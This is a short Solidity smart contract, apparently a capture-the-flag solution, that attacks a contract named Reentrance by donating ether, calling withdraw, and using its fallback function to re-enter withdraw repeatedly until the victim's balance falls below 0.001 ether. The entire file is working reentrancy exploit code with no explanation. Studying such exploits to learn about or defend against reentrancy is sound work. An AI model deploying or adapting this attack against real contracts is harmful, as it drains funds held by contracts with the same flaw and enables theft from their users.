// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract ReentrancyAttacker {
    Reentrance public victimContract;

    constructor (address payable _victimContractAddress) {
        victimContract = Reentrance(_victimContractAddress);
    }

    function attack() external payable {
       victimContract.donate{value: msg.value}(address(this));
       victimContract.withdraw(msg.value);
    }

    fallback() external payable {
        if(address(victimContract).balance >= 1000000000000000)
        victimContract.withdraw(1000000000000000);
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}